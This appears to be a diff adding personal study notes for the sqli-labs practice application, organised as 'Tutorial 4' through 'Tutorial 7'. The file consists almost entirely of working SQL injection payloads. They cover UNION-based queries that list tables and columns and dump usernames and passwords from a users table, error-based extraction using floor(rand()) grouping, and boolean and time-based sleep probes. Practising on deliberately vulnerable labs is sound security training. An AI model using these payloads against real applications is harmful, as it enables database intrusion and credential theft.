@@ -1,0 +1,17 @@
+Tutorial 4:
+http://localhost/sqli-labs/Less-1/?id=-1' union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=database() --+
+http://localhost/sqli-labs/Less-1/?id=-1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='users' --+
+http://localhost/sqli-labs/Less-1/?id=-1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='uagents' --+
+http://localhost/sqli-labs/Less-1/?id=-1' union select 1, group_concat(username), group_concat(password) from users --+
+
+Tutorial 5:
+select 1 from (select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a) b
+select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a) b
+
+Tutorial 6:
+select ascii(substr((select database()), 1, 1));
+
+
+Tutorial 7:
+select if((select database())="security", sleep(10), null);
+
